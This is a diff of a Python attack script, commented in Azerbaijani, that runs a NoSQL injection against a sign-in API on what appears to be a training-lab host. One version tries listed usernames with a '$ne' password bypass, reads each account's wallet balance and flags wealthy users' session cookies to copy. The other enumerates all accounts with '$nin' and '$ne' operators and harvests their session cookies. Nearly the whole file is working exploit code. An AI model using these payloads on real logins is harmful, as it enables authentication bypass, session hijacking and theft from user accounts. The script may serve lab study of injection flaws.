@@ -1,85 +1,74 @@
 import requests
 import json
 
-# Sənin verdiyin hədəf URL
-base_url = "http://web0x01.hbtn/api/a3/nosql_injection"
-login_url = f"{base_url}/sign_in"
-
-# Sənin tapdığın istifadəçilər siyahısı
-target_users = [
-    "foued", "abdou", "maroua", "yosri", "ismail", 
-    "dexter", "john", "hugo", "elon-musk", "jim", "jimmy"
-]
+# URL və Header-lər
+url = "http://web0x01.hbtn/api/a3/nosql_injection/sign_in"
 
 headers = {
+    "User-Agent": "Mozilla/5.0 (Python Script)",
     "Content-Type": "application/json",
-    "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36"
+    "Origin": "http://web0x01.hbtn",
+    "Referer": "http://web0x01.hbtn/a3/nosql_injection/"
 }
 
-# HBTNc-nin təxmini qiyməti (bunu keçən varlı sayılır)
-TARGET_PRICE = 50000 
+# Tapılan istifadəçiləri burada yadda saxlayacağıq ki, təkrar gəlməsinlər
+known_users = []
 
-print(f"[*] {len(target_users)} istifadəçi yoxlanılır...\n")
-print(f"{'USERNAME':<15} | {'USD BALANS':<15} | {'COOKIE (SESSION)'}")
-print("-" * 80)
+print(f"[*] Bütün istifadəçilərin Cookie-ləri çıxarılır...\n")
+print(f"{'USERNAME':<20} | {'COOKIE (SESSION)':<50}")
+print("-" * 75)
 
-for user in target_users:
-    # Hər istifadəçi üçün xüsusi payload
-    # Məntiq: "Adı 'bu' olsun, şifrəsi boş olmasın"
+while True:
+    # Payload: Bildiyimiz istifadəçiləri istisna edirik ($nin)
     payload = {
-        "username": user,
+        "username": {"$nin": known_users},
         "password": {"$ne": ""}
     }
 
     try:
-        # Login sorğusu
-        r = requests.post(login_url, json=payload, headers=headers)
+        # Sorğunu göndər
+        r = requests.post(url, json=payload, headers=headers)
         
-        # Cookie-ni götürürük
-        session_cookie = r.cookies.get("session")
-        cookie_str = f"session={session_cookie}" if session_cookie else "COOKIE_YOXDUR"
+        # Cookie-ni götür
+        cookie_val = r.cookies.get("session")
         
-        # JSON cavabını oxuyuruq
-        try:
-            data = r.json()
-        except:
-            print(f"{user:<15} | Xəta (JSON deyil)  | {cookie_str}")
-            continue
+        if not cookie_val:
+            print("\n[!] Cookie tapılmadı və ya siyahı bitdi.")
+            break
 
-        usd_balance = 0.0
+        # JSON cavabını oxu
+        data = r.json()
         
-        # Balansı yoxlayırıq
+        # İstifadəçi adını tapmağa çalışırıq
+        current_user = None
+        
         if data.get("status") == "success":
             msg = data.get("message")
             
-            # Əgər mesaj bir obyektdirsə (wallet məlumatı varsa)
+            # Hal 1: Normal istifadəçi (Adı görünür)
             if isinstance(msg, dict):
-                wallet = msg.get("wallet", [])
-                for coin in wallet:
-                    if coin.get("coin") == "USD":
-                        usd_balance = float(coin.get("amount", 0))
+                current_user = msg.get("username")
                 
-                # Ekrana çap edirik
-                print(f"{user:<15} | ${usd_balance:<14,.2f} | {session_cookie[:20]}...")
-
-                # Varlı adamı yoxlayırıq
-                if usd_balance > TARGET_PRICE:
-                    found_user = user
-                    found_cookie = cookie_str
-                    print("\n" + "!"*60)
-                    print(f"!!! VARLI İSTİFADƏÇİ TAPILDI: {user.upper()} !!!")
-                    print(f"!!! Balans: ${usd_balance:,.2f}")
-                    print(f"!!! Cookie (Bunu kopyala): {found_cookie}")
-                    print("!"*60 + "\n")
-            
-            # Bəzən server sadəcə "Congratulations" mesajı verir (məlumatı gizli olanlar)
+            # Hal 2: Gizli istifadəçi (Adı yoxdur, sadəcə təbrik mesajı var)
             elif isinstance(msg, str):
-                 print(f"{user:<15} | {'GİZLİ HESAB':<15} | {session_cookie[:20]}... (Bunu yoxla!)")
+                current_user = "UNKNOWN_VIP" 
+                print(f"{current_user:<20} | {cookie_val}")
+                print(f"\n[!!!] DİQQƏT: 'UNKNOWN_VIP' tapıldı (Böyük ehtimalla hədəf budur).")
+                print(f"[!!!] Bu Cookie-ni yoxla: session={cookie_val}")
+                # Adını bilmədiyimiz üçün onu $nin siyahısına sala bilmirik, dövr burada bitir
+                break
 
+        # Əgər istifadəçi adı gəldisə və biz onu artıq bilmiriksə
+        if current_user and current_user not in known_users:
+            print(f"{current_user:<20} | {cookie_val}")
+            known_users.append(current_user)
         else:
-            print(f"{user:<15} | Giriş Uğursuz     | -")
+            # Əgər eyni adam təkrar gəlirsə və ya ad yoxdursa, deməli bitdi
+            break
 
     except Exception as e:
-        print(f"{user:<15} | Xəta: {e}")
+        print(f"\n[!] Xəta baş verdi: {e}")
+        break
 
-print("\n[*] Yoxlama bitdi.")
+print("\n[*] Siyahı tamamlandı.")
+print(f"[*] Cəmi {len(known_users)} istifadəçi tapıldı.")
